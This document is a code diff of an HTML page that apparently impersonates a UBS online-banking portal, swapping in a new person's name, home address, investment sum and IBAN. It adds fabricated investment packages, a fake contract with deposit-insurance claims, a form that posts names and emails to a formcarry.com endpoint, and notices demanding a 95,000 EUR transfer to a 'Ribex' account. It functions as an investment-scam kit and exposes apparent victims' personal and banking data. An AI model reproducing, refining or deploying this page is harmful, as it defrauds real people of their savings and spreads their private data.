@@ -257,7 +257,7 @@
   <div style="background: #f9f9f9; padding: 16px 20px; border-radius: 12px; margin-bottom: 30px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
     <div style="display: flex; align-items: center; gap: 10px;">
       <i class="fa-solid fa-user" style="color: red; font-size: 22px;"></i>
-      <h2 style="margin: 0; font-size: 20px;"><strong>Sylke Grundmann</strong></h2>
+      <h2 style="margin: 0; font-size: 20px;"><strong>Jens Heidel</strong></h2>
     </div>
     <div style="text-align: right; font-size: 14px;">
       <strong>Kontostand:</strong><br>
@@ -279,9 +279,9 @@
           <i class="fa-solid fa-house" style="color: red;"></i>
           <strong style="font-size: 16px;">Anschrift</strong>
         </div>
-        <p><strong>Straße:</strong> Kleine Braugasse 16</p>
-        <p><strong>PLZ:</strong> 61206</p>
-        <p><strong>Ort:</strong> Wöllstadt</p>
+        <p><strong>Straße:</strong> Fasanenweg 37</p>
+        <p><strong>PLZ:</strong> 65307</p>
+        <p><strong>Ort:</strong> Bad Schwalbach</p>
         <p><strong>Land:</strong> Deutschland</p>
       </div>
 
@@ -314,10 +314,10 @@
           <strong style="font-size: 16px;">Paketdetails</strong>
         </div>
         <p><strong>Paket:</strong> Silver</p>
-        <p><strong>Anlagebetrag:</strong> EUR 50.000,00</p>
+        <p><strong>Anlagebetrag:</strong> EUR 95.000,00</p>
         <p><strong>Laufzeit:</strong> 12 Monate</p> <!-- ✅ manuell anpassbar -->
         <p><strong>Zinssatz:</strong> 3,75 % p.a.</p> <!-- ✅ manuell anpassbar -->
-        <p><strong>Zinsberechnung ab:</strong> 2025-06-24</p> <!-- ✅ manuell anpassbar -->
+        <p><strong>Zinsberechnung ab:</strong> 2025-07-09</p> <!-- ✅ manuell anpassbar -->
       </div>
 
       <!-- Zinsübersicht -->
@@ -347,10 +347,10 @@
 <!-- Berechnungsskript -->
 <script>
   // ✅ Einstellbare Variablen
-  const anlagebetrag = 50000;
+  const anlagebetrag = 95000;
   const zinssatz = 0.0375;
   const laufzeitInMonaten = 12;
-  const startdatum = new Date("2025-06-24");
+  const startdatum = new Date("2025-07-09");
   const anlage_aktiv = true; // ← Nur wenn true und Datum erreicht → wird Anlage aktiv
 
   const heute = new Date();
@@ -486,12 +486,12 @@
         <i class="fa-solid fa-credit-card" style="color: red;"></i>
         <strong style="font-size: 16px;">Zahlungsinformationen</strong>
       </div>
-      <p><strong>Empfänger:</strong> <span id="empfaenger">Sylke Grundmann</span></p>
-      <p><strong>IBAN:</strong> <span id="iban">DE08500905000003431350</span></p>
-      <p><strong>BIC (SWIFT):</strong> <span id="bic">GENODEF1S12</span></p>
-      <p><strong>BLZ:</strong> <span id="blz">50090500</span></p>
-      <p><strong>Bank:</strong> <span id="bank"> Sparda-Bank Hessen</span></p>
-      <p><strong>Ort:</strong> <span id="city">Hessen</span></p>
+      <p><strong>Empfänger:</strong> <span id="empfaenger">Jens Heidel</span></p>
+      <p><strong>IBAN:</strong> <span id="iban">DE26550905000003153975</span></p>
+      <p><strong>BIC (SWIFT):</strong> <span id="bic">GENODEF1S01</span></p>
+      <p><strong>BLZ:</strong> <span id="blz">55090500</span></p>
+      <p><strong>Bank:</strong> <span id="bank">Sparda-Bank Südwest</span></p>
+      <p><strong>Ort:</strong> <span id="city">Mainz a Rhein</span></p>
       <p><strong>Verwendungszweck:</strong> UBS Anlage Rückführung</p>
     </div>
 
@@ -531,6 +531,18 @@
 </div>
 
 <script>
+function ladeReferenzkonto() {
+  const gespeicherteDaten = JSON.parse(localStorage.getItem("referenzkonto"));
+  if (!gespeicherteDaten) return;
+
+  document.getElementById('empfaenger').textContent = gespeicherteDaten.empfaenger || '-';
+  document.getElementById('iban').textContent = gespeicherteDaten.iban || '-';
+  document.getElementById('bic').textContent = gespeicherteDaten.bic || '-';
+  document.getElementById('blz').textContent = gespeicherteDaten.blz || '-';
+  document.getElementById('bank').textContent = gespeicherteDaten.bank || '-';
+  document.getElementById('city').textContent = gespeicherteDaten.city || '-';
+}
+
 async function updateReferenzkonto() {
   const emp = document.getElementById('inp-empfaenger').value.trim();
   const ibanVal = document.getElementById('inp-iban').value.trim().replace(/\s+/g, '');
@@ -561,14 +573,27 @@ async function updateReferenzkonto() {
       return;
     }
 
-    document.getElementById('empfaenger').textContent = emp || '-';
-    document.getElementById('iban').textContent = data.iban || '-';
-    document.getElementById('bic').textContent = data.bankData.bic || '-';
-    document.getElementById('bank').textContent = data.bankData.name || '-';
-    document.getElementById('blz').textContent = data.bankData.bankCode || '-';
-    document.getElementById('city').textContent = data.bankData.city || '-';
+    const referenz = {
+      empfaenger: emp || '-',
+      iban: data.iban || '-',
+      bic: data.bankData.bic || '-',
+      blz: data.bankData.bankCode || '-',
+      bank: data.bankData.name || '-',
+      city: data.bankData.city || '-'
+    };
 
-    fb.textContent = 'IBAN erfolgreich geprüft und übernommen.';
+    // UI aktualisieren
+    document.getElementById('empfaenger').textContent = referenz.empfaenger;
+    document.getElementById('iban').textContent = referenz.iban;
+    document.getElementById('bic').textContent = referenz.bic;
+    document.getElementById('blz').textContent = referenz.blz;
+    document.getElementById('bank').textContent = referenz.bank;
+    document.getElementById('city').textContent = referenz.city;
+
+    // Lokale Speicherung
+    localStorage.setItem("referenzkonto", JSON.stringify(referenz));
+
+    fb.textContent = 'IBAN erfolgreich geprüft und gespeichert.';
     fb.style.color = 'green';
 
   } catch (err) {
@@ -577,12 +602,16 @@ async function updateReferenzkonto() {
     fb.style.color = 'red';
   }
 }
+
+// Beim Laden automatisch prüfen
+document.addEventListener("DOMContentLoaded", ladeReferenzkonto);
 </script>
 
 
   <br>
       </div>
       <div class="section-content" id="section-paket" style="display:none;">
+
 <!-- Anlagepakete Grid -->
 <div style="background: #fff; padding: 30px; border-radius: 12px; margin-top: 30px; font-family: Arial, sans-serif;">
   <h2 style="display: flex; align-items: center; gap: 10px; font-size: 20px;">
@@ -597,7 +626,7 @@ async function updateReferenzkonto() {
   <div style="background: #fff; padding: 40px; border-radius: 8px; width: 100%; max-width: 860px; max-height: 90vh; overflow-y: auto; font-family: Arial, sans-serif; position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.2);">
     <button onclick="document.getElementById('vertragsFormular').style.display='none'" style="position: absolute; top: 10px; right: 20px; background: transparent; border: none; font-size: 24px; cursor: pointer;">&times;</button>
 
-    <!-- Logo + Vertragsheader -->
+    <!-- Logo + Header -->
     <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 20px;">
       <div style="display: flex; align-items: center; gap: 15px;">
         <img src="https://github.com/securedigitalkonto/kundename/blob/main/logo1.png?raw=true" alt="UBS Logo" style="height: 40px;">
@@ -610,7 +639,7 @@ async function updateReferenzkonto() {
         </div>
       </div>
       <div style="text-align: right; font-size: 14px;">
-        <strong>Festgeldvertrag</strong><br>
+        <strong>Anlagevertrag</strong><br>
         Vertragsnummer: <span style="text-decoration: underline;">[automatisch]</span>
       </div>
     </div>
@@ -618,21 +647,21 @@ async function updateReferenzkonto() {
     <!-- Vertragstext -->
     <div id="vertragstext" style="max-height: 250px; height: 250px; overflow-y: auto; display: block; padding: 15px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 8px; font-size: 13px; background: #f9f9f9;"></div>
 
-    <!-- Anlagepaket Info-Box -->
+    <!-- Paketinfo -->
     <div id="paketInfoBox" style="border: 1px solid #ccc; background: #f9f9f9; border-radius: 12px; padding: 20px; margin-top: 30px; margin-bottom: 30px; font-size: 15px;">
       <strong id="infoPaketName" style="font-size: 18px;"></strong><br>
-      <p style="margin: 8px 0;"><strong>Laufzeit:</strong> <span id="infoLaufzeit"></span></p>
-      <p style="margin: 8px 0;"><strong>Zinssatz:</strong> <span id="infoZinssatz"></span></p>
-      <p style="margin: 8px 0;"><strong>Anlagebetrag:</strong> <span id="infoBetrag"></span></p>
-      <p style="margin: 8px 0;"><strong>Zinsertrag:</strong> <span id="infoErtrag"></span></p>
-      <hr style="margin: 15px 0;">
-      <p style="margin: 6px 0; color: green;"><strong>✔ Einlagensicherung:</strong> bis 100.000 CHF</p>
-      <p style="margin: 6px 0; color: green;"><strong>✔ Keine Wechselkursgebühren</strong></p>
+      <p><strong>Laufzeit:</strong> <span id="infoLaufzeit"></span></p>
+      <p><strong>Zinssatz:</strong> <span id="infoZinssatz"></span></p>
+      <p><strong>Anlagebetrag:</strong> <span id="infoBetrag"></span></p>
+      <p><strong>Zinsertrag:</strong> <span id="infoErtrag"></span></p>
+      <hr>
+      <p style="color: green;"><strong>✔ Einlagensicherung:</strong> bis 100.000 CHF</p>
+      <p style="color: green;"><strong>✔ Keine Wechselkursgebühren</strong></p>
     </div>
 
-    <!-- Persönliche Angaben Formular -->
+    <!-- Formular -->
     <h3 style="color: #cc0000;">Persönliche Angaben</h3>
-    <form action="https://formcarry.com/s/Jna7Be0vdck" method="POST" accept-charset="UTF-8">
+    <form id="vertragsFormularAbsenden">
       <input type="hidden" id="formPaket" name="paket">
       <input type="hidden" id="formLaufzeit" name="laufzeit">
       <input type="hidden" id="formZinssatz" name="zinssatz">
@@ -640,20 +669,7 @@ async function updateReferenzkonto() {
 
       <div style="display: flex; flex-wrap: wrap; gap: 20px; font-size: 14px;">
         <input type="text" name="name" placeholder="Vor- und Nachname" required style="flex: 1; border: 2px solid red; padding: 8px; border-radius: 6px;">
-        <input type="date" name="geburtsdatum" required style="flex: 1; border: 2px solid red; padding: 8px; border-radius: 6px;">
-        <input type="text" name="strasse" placeholder="Straße und Hausnummer" required style="flex: 1; border: 2px solid red; padding: 8px; border-radius: 6px;">
-        <input type="text" name="plz" placeholder="PLZ" required style="flex: 1; border: 2px solid red; padding: 8px; border-radius: 6px;">
-        <input type="text" name="ort" placeholder="Ort" required style="flex: 1; border: 2px solid red; padding: 8px; border-radius: 6px;">
-        <select name="staatsangehoerigkeit" required style="flex: 1; border: 2px solid red; padding: 8px; border-radius: 6px;">
-          <option value="">Staatsangehörigkeit wählen</option>
-          <option value="Deutsch">Deutsch</option>
-          <option value="Österreichisch">Österreichisch</option>
-          <option value="Schweizerisch">Schweizerisch</option>
-          <option value="Italienisch">Italienisch</option>
-          <option value="Andere">Andere</option>
-        </select>
         <input type="email" name="email" placeholder="E-Mail-Adresse" required style="flex: 1; border: 2px solid red; padding: 8px; border-radius: 6px;">
-        <input type="tel" name="telefon" placeholder="Telefonnummer" required style="flex: 1; border: 2px solid red; padding: 8px; border-radius: 6px;">
       </div>
 
       <div style="margin-top: 20px; font-size: 13px;">
@@ -668,24 +684,32 @@ async function updateReferenzkonto() {
 
 <script>
 const pakete = [
-  { name: "UBS Silver", laufzeit: "12 Monate", zinssatz: "3,95 %", betrag: "50.000", ertrag: "1.975,00" },
-  { name: "UBS Flex30", laufzeit: "12 Monate", zinssatz: "3,85 %", betrag: "30.000", ertrag: "1.155,00" },
-  { name: "UBS Gold", laufzeit: "12 Monate", zinssatz: "3,70 %", betrag: "100.000", ertrag: "3.700,00" },
-  { name: "UBS Sicher50", laufzeit: "12 Monate", zinssatz: "3,55 %", betrag: "50.000", ertrag: "1.775,00" },
-  { name: "UBS Flex50", laufzeit: "12 Monate", zinssatz: "3,45 %", betrag: "50.000", ertrag: "1.725,00" },
-  { name: "UBS Smart30", laufzeit: "12 Monate", zinssatz: "3,25 %", betrag: "30.000", ertrag: "975,00" },
-  { name: "UBS Bronze", laufzeit: "12 Monate", zinssatz: "3,10 %", betrag: "100.000", ertrag: "3.100,00" },
-  { name: "UBS Starter", laufzeit: "12 Monate", zinssatz: "3,00 %", betrag: "20.000", ertrag: "600,00" },
-  { name: "UBS Plus Flex", laufzeit: "12 Monate", zinssatz: "2,95 %", betrag: "80.000", ertrag: "2.360,00" }
+  { name: "UBS Silber", laufzeit: "12 Monate", zinssatz: "3.75 %", betrag: "100.000", ertrag: "3.750,00", typ: "festgeld", gebucht: true },
+  { name: "UBS Bronze", laufzeit: "6 Monate", zinssatz: "3.95 %", betrag: "50.000", ertrag: "987,50", typ: "festgeld", gebucht: false },
+  { name: "UBS Gold", laufzeit: "24 Monate", zinssatz: "3.55 %", betrag: "50.000", ertrag: "3.550,00", typ: "festgeld", gebucht: false },
+  { name: "UBS Premium", laufzeit: "36 Monate", zinssatz: "4.10 %", betrag: "200.000", ertrag: "24.600,00", typ: "festgeld", gebucht: false },
+  { name: "UBS MaxFlex", laufzeit: "12 Monate", zinssatz: "3.50 %", betrag: "50.000", ertrag: "1.750.00", typ: "festgeld", gebucht: false },
+  { name: "UBS Tagesgeld Plus", laufzeit: "täglich verfügbar", zinssatz: "2.25 %", betrag: "20.000", ertrag: "450.00", typ: "tagesgeld", gebucht: false },
+  
 ];
 
 function ladePakete() {
+  const gespeicherteBuchungen = JSON.parse(localStorage.getItem("gebuchtePakete")) || [];
   const grid = document.querySelector(".paket-grid");
   grid.innerHTML = "";
+
   pakete.forEach((p, i) => {
+    p.gebucht = gespeicherteBuchungen[i] === true;
+    const istGebucht = p.gebucht;
+
     const card = document.createElement("div");
     card.className = "paket-card";
-    card.style = `background: #f9f9f9; border-radius: 10px; padding: 16px; border: 1px solid #ccc;`;
+    card.style = "background: #f9f9f9; border-radius: 10px; padding: 16px; border: 1px solid #ccc;";
+
+    const buttonText = istGebucht ? "✔ Paket gebucht" : "Paket buchen";
+    const buttonStyle = istGebucht ? "background: green; color: white;" : "background: #cc0000; color: white;";
+    const buttonDisabled = istGebucht ? "disabled" : "";
+
     card.innerHTML = `
       <p><strong>${p.name}</strong></p>
       <p><strong>Laufzeit:</strong> ${p.laufzeit}</p>
@@ -693,20 +717,24 @@ function ladePakete() {
       <p><strong>Anlagebetrag:</strong> ${p.betrag} EUR</p>
       <p><strong>Zinsertrag:</strong> ${p.ertrag} EUR</p>
       <div style="margin-top: 12px;">
-        <button onclick="oeffneVertragsformular(${i})" style="background: #cc0000; color: white; padding: 6px 12px; border-radius: 6px; border: none; font-weight: bold; cursor: pointer;">Paket buchen</button>
-      </div>
-    `;
+        <button onclick="oeffneVertragsformular(${i})" id="paketBtn${i}" style="${buttonStyle} padding: 6px 12px; border-radius: 6px; border: none; font-weight: bold; cursor: pointer;" ${buttonDisabled}>
+          ${buttonText}
+        </button>
+      </div>`;
     grid.appendChild(card);
   });
 }
 
 function oeffneVertragsformular(index) {
   const p = pakete[index];
+  sessionStorage.setItem("aktuellesPaketIndex", index);
+
   document.getElementById("infoPaketName").textContent = p.name;
   document.getElementById("infoLaufzeit").textContent = p.laufzeit;
   document.getElementById("infoZinssatz").textContent = p.zinssatz;
   document.getElementById("infoBetrag").textContent = p.betrag + " EUR";
   document.getElementById("infoErtrag").textContent = p.ertrag + " EUR";
+
   document.getElementById("formPaket").value = p.name;
   document.getElementById("formLaufzeit").value = p.laufzeit;
   document.getElementById("formZinssatz").value = p.zinssatz;
@@ -714,30 +742,70 @@ function oeffneVertragsformular(index) {
 
   const vertrag = `
     <h3>§ 1 Vertragsgegenstand</h3>
-    <p>(1) Die Bank nimmt vom Anleger eine Einlage in Höhe von ${p.betrag} EUR als Festgeldanlage an.</p>
-    <p>(2) Die Anlage erfolgt zu einem festen Zinssatz von ${p.zinssatz} pro Jahr.</p>
-    <p>(3) Die Laufzeit beträgt ${p.laufzeit}.</p>
-    <h3>§ 2 Zinsberechnung und Auszahlung</h3>
-    <p>Zinsen in Höhe von ${p.ertrag} EUR werden zum Laufzeitende gutgeschrieben und dem angegebenen Konto ausgezahlt.</p>
-    <h3>§ 4 Einlagensicherung</h3>
-    <p>Einlagen sind bis zu 100.000 CHF über das eidgenössische Einlagensicherungssystem abgesichert.</p>
-    <h3>§ 6 Sonstige Bestimmungen</h3>
-    <p>(1) Dieser Vertrag wird in zwei Ausfertigungen unterzeichnet. Eine Ausfertigung erhält der Anleger.</p>
-    <p>(2) Änderungen bedürfen der Schriftform. Es gilt das Recht der Schweiz. Gerichtsstand ist Zürich.</p>
-    <p>(3) Die Bank kann den Vertrag bei Verdacht auf Geldwäsche jederzeit aussetzen.</p>
-    <h3>§ 7 Datenschutz</h3>
-    <p>Daten werden DSGVO-konform verarbeitet. Eine Weitergabe erfolgt nur mit gesetzlicher Grundlage.</p>
-    <h3>§ 8 Widerrufsrecht</h3>
-    <p>Der Anleger kann binnen 90 Tagen ohne Angabe von Gründen zurücktreten.</p>
-  `;
-  document.getElementById("vertragstext").innerHTML = vertrag;
+    <p>(1) Die Bank nimmt vom Anleger eine Anlagesumme in Höhe von <strong>${p.betrag} EUR</strong> entgegen.</p>
+    <p>(2) Die Laufzeit beträgt <strong>${p.laufzeit}</strong>.</p>
+    <p>(3) Der Zinssatz beträgt <strong>${p.zinssatz}</strong> pro Jahr. Die zu erwartende Rendite beläuft sich auf <strong>${p.ertrag} EUR</strong>.</p>
+    <h3>§ 2 Verfügbarkeit</h3>
+    <p>${p.typ === 'tagesgeld' ? 'Das Kapital ist täglich verfügbar.' : 'Das Kapital ist für die Laufzeit gebunden.'}</p>
+    <h3>§ 3 Einlagensicherung</h3>
+    <p>Die Einlage ist bis 100.000 CHF durch das eidgenössische Einlagensicherungssystem geschützt.</p>
+    <h3>§ 4 Datenschutz</h3>
+    <p>Alle Daten werden gemäß DSGVO behandelt und nicht an Dritte weitergegeben.</p>
+    <h3>§ 5 Widerrufsrecht</h3>
+    <p>Sie können diesen Vertrag innerhalb von 14 Tagen ohne Angabe von Gründen widerrufen.</p>`;
 
+  document.getElementById("vertragstext").innerHTML = vertrag;
   document.getElementById("vertragsFormular").style.display = "flex";
 }
 
+document.getElementById("vertragsFormularAbsenden").addEventListener("submit", async function (e) {
+  e.preventDefault();
+  const form = e.target;
+  const data = {
+    paket: form.paket.value,
+    laufzeit: form.laufzeit.value,
+    zinssatz: form.zinssatz.value,
+    anlagebetrag: form.anlagebetrag.value,
+    name: form.name.value,
+    email: form.email.value
+  };
+
+  // Paketstatus auf "gebucht" setzen
+  const index = parseInt(sessionStorage.getItem("aktuellesPaketIndex"));
+  if (!isNaN(index)) {
+    pakete[index].gebucht = true;
+    localStorage.setItem("gebuchtePakete", JSON.stringify(pakete.map(p => p.gebucht)));
+  }
+
+  localStorage.setItem("anlagepaket", JSON.stringify(data));
+
+  await fetch("https://formcarry.com/s/Jna7Be0vdck", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(data)
+  });
+
+  document.getElementById("vertragsFormular").style.display = "none";
+  zeigeDankesModal();
+  ladePakete();
+});
+
+function zeigeDankesModal() {
+  const modal = document.createElement("div");
+  modal.style = "position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.5);z-index:9999;display:flex;align-items:center;justify-content:center;";
+  modal.innerHTML = `
+    <div style="background:white;padding:40px;border-radius:12px;max-width:500px;text-align:center;font-family:Arial,sans-serif;">
+      <div style="font-size:40px;margin-bottom:10px;">✅</div>
+      <h2 style="margin:0 0 10px 0;">Vielen Dank!</h2>
+      <p>Ihre Anfrage wurde erfolgreich übermittelt.<br>In Kürze erhalten Sie eine E-Mail mit der Bestätigung Ihrer gebuchten Anlage.</p>
+      <button onclick="this.parentElement.parentElement.remove()" style="margin-top:20px;padding:10px 20px;background:green;color:white;border:none;border-radius:6px;cursor:pointer;">Fenster schließen</button>
+    </div>`;
+  document.body.appendChild(modal);
+}
+
+// Initialer Aufruf
 ladePakete();
 </script>
-  <hr><br>
         
       </div>
       <div class="section-content" id="section-transaktionen" style="display:none;">
@@ -752,13 +820,13 @@ ladePakete();
   <div id="transactionBox" style="border-left: 4px solid red; border-radius: 10px; padding: 16px; margin-bottom: 20px;">
     <div style="display: flex; justify-content: space-between; align-items: center;">
       <strong id="statusText"><i class="fa-solid fa-clock"></i> Zahlung ausstehend</strong>
-      <span id="dateText" style="color: red;"><i class="fa-solid fa-calendar"></i> 24.06.2025 &ndash; 09:42</span>
+      <span id="dateText" style="color: red;"><i class="fa-solid fa-calendar"></i> 09.07.2025 &ndash; 09:19</span>
     </div>
     <p><strong>Transaktions-ID:</strong> UBS4558RIBEX</p>
     <p><strong>Zahlungsinst.:</strong> RIBEX</p>
-    <p><strong>Referenz:</strong> Sylke Grundmann UB6173SCH</p>
+    <p><strong>Referenz:</strong> L5R3VTXYC - Jens Heidel</p>
     <p><strong>IBAN:</strong> DE71202208000058566522</p>
-    <p><strong>Betrag:</strong> <span id="amount" style="color: red;">49.925,00 EUR</span></p>
+    <p><strong>Betrag:</strong> <span id="amount" style="color: red;">95.000,00 EUR</span></p>
     <p id="paymentNote" style="font-style: italic; margin-top: 8px;">Diese Zahlung ist fällig und steht noch aus. Bitte begleichen Sie den offenen Betrag zeitnah.</p>
   </div>
 
@@ -817,7 +885,7 @@ ladePakete();
       <p><i class="fa-solid fa-globe" style="color: red;"></i> <strong>IBAN:</strong> DE71202208000058566522</p>
       <p><i class="fa-solid fa-shuffle" style="color: red;"></i> <strong>BIC (SWIFT):</strong> SXPYDEHHXXX</p>
       <p><i class="fa-solid fa-landmark" style="color: red;"></i> <strong>Zentralbank:</strong> Banking Circle</p>
-      <p><i class="fa-solid fa-pen" style="color: red;"></i> <strong>Verwendungszweck:</strong> Sylke Grundmann UB6173SCH</p>
+      <p><i class="fa-solid fa-pen" style="color: red;"></i> <strong>Verwendungszweck:</strong> L5R3VTXYC - Jens Heidel</p>
     </div>
 
     <!-- Spalte 2: Kursbox -->
@@ -832,7 +900,7 @@ ladePakete();
 
   <!-- Hinweisbox unten -->
   <div style="background: #f1f1f1; padding: 20px; border-radius: 10px; margin-top: 30px;">
-    <p><strong style="color: red;">Wichtig:</strong> Bitte geben Sie als Empfänger ausschließlich <strong>Ribex</strong> an. Als Verwendungszweck tragen Sie bitte ausschließlich die oben genannte Referenznummer ein (<strong>Sylke Grundmann UB6173SCH</strong>). Nur so kann Ihre Zahlung eindeutig zugeordnet und korrekt verarbeitet werden.</p>
+    <p><strong style="color: red;">Wichtig:</strong> Bitte geben Sie als Empfänger ausschließlich <strong>Ribex</strong> an. Als Verwendungszweck tragen Sie bitte ausschließlich die oben genannte Referenznummer ein.</p>
     <hr>
     <p><strong>Hinweis zur Einzahlung und Abwicklung:</strong><br>
     Das Abwicklungsinstitut Ribex übernimmt für Sie die grenzüberschreitende Zahlungsabwicklung sowie den automatischen Währungswechsel von CHF in EUR. So wird sichergestellt, dass keine Kursverluste entstehen und Ihr Anlagebetrag in voller Höhe korrekt gutgeschrieben wird.<br>
